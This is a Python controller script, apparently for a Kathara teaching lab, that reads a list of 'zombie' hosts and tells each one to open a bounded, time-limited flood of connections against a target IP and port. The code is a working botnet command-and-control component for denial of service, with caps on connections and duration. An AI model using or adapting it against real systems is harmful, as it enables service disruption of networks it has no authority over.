#!/usr/bin/env python3
"""
attacker.py - educational C2 controller for a Kathara lab.
It sends a bounded, time-limited load command to zombie agents.

Usage inside the attacker container:
  python3 /hostlab/attacker.py <TARGET_IP> <PORT> [connections_per_zombie] [duration_seconds]
"""
import os
import socket
import sys
import threading

ZOMBIE_PORT = 9999
ZOMBIES_PATHS = ("/hostlab/zombies.txt", "/zombies.txt", "zombies.txt")
DEFAULT_CONNECTIONS = 300
DEFAULT_DURATION = 30
MAX_CONNECTIONS_PER_ZOMBIE = 1000
MAX_DURATION = 90


def find_zombies_file() -> str | None:
    for path in ZOMBIES_PATHS:
        if os.path.exists(path):
            return path
    return None


def bounded_int(value: str, default: int, minimum: int, maximum: int, label: str) -> int:
    if value is None:
        return default
    try:
        number = int(value)
    except ValueError:
        raise ValueError(f"{label} must be an integer")
    if number < minimum:
        raise ValueError(f"{label} must be >= {minimum}")
    if number > maximum:
        print(f"[WARN] {label} capped from {number} to {maximum} to keep the test controlled")
        number = maximum
    return number


def send_attack_command(zombie_ip: str, target_ip: str, target_port: int, connections: int, duration: int) -> None:
    try:
        with socket.create_connection((zombie_ip, ZOMBIE_PORT), timeout=4) as s:
            command = f"ATTACK {target_ip} {target_port} {connections} {duration}\n"
            s.sendall(command.encode())
            try:
                reply = s.recv(1024).decode(errors="ignore").strip()
            except OSError:
                reply = ""
        print(f"[OK] Zombie {zombie_ip}: command sent" + (f" - {reply}" if reply else ""))
    except Exception as exc:
        print(f"[ERROR] Zombie {zombie_ip} is unreachable on port {ZOMBIE_PORT}: {exc}")


def main() -> int:
    if len(sys.argv) < 3:
        print("Usage: python3 /hostlab/attacker.py <TARGET_IP> <PORT> [connections_per_zombie] [duration_seconds]")
        return 1

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    connections = bounded_int(sys.argv[3] if len(sys.argv) >= 4 else None, DEFAULT_CONNECTIONS, 1, MAX_CONNECTIONS_PER_ZOMBIE, "conn_per_zombie")
    duration = bounded_int(sys.argv[4] if len(sys.argv) >= 5 else None, DEFAULT_DURATION, 1, MAX_DURATION, "duration_seconds")

    zombies_file = find_zombies_file()
    if not zombies_file:
        print(f"[ERROR] zombies.txt not found. Paths checked: {', '.join(ZOMBIES_PATHS)}")
        print("Regenerate the lab with --zombies manual --zombies-ips '10.20.1.11,10.20.1.12,10.20.1.13'")
        return 1

    with open(zombies_file, "r", encoding="utf-8") as f:
        zombies = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]

    if not zombies:
        print(f"[ERROR] {zombies_file} exists but contains no zombie IP addresses.")
        return 1

    print(f"[INFO] Zombies read from {zombies_file}: {', '.join(zombies)}")
    print(f"[INFO] Target: {target_ip}:{target_port}; load: {connections} connections/zombie for {duration}s")

    threads = []
    for zombie_ip in zombies:
        t = threading.Thread(target=send_attack_command, args=(zombie_ip, target_ip, target_port, connections, duration), daemon=True)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("[OK] Commands sent. Inspect an individual zombie with: tail -f /tmp/zombie.log")
    return 0


if __name__ == "__main__":
    sys.exit(main())
